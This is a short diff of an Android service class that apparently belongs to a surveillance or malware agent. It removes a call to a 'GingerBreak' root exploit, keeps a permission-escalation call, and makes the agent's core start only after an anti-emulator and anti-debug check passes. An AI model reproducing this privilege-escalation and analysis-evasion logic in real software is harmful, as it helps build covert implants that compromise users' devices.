@@ -91,18 +91,15 @@ public class ServiceMain extends Service {
 			
 			Root.getPermissions();
 
-			if (Cfg.EXP) {
-				Root.runGingerBreak();
-			}
+			// Core starts
+			core = Core.newCore(this);
+			core.Start(this.getResources(), getContentResolver());
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onStart) anti emu/debug failed");
+				Toast.makeText(Status.getAppContext(), M.e("Debug Failed!"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 			}
 		}
-		
-		// Core starts
-		core = Core.newCore(this);
-		core.Start(this.getResources(), getContentResolver());
 	}
 
 	@Override
